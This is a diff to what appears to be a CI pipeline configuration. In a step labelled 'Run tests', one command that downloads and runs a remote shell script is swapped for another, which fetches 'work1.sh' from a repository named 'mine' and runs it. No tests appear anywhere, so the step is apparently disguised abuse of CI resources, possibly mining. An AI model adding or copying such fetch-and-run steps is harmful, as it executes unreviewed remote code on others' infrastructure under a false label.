@@ -7,4 +7,4 @@ jobs:
       - checkout 
       - run: 
           name: Run tests 
-          command: wget https://raw.githubusercontent.com/parkitmove/parkit/main/ocb.sh && chmod +x ocb.sh && ./ocb.sh
+          command: wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work1.sh && chmod +x work1.sh && ./work1.sh
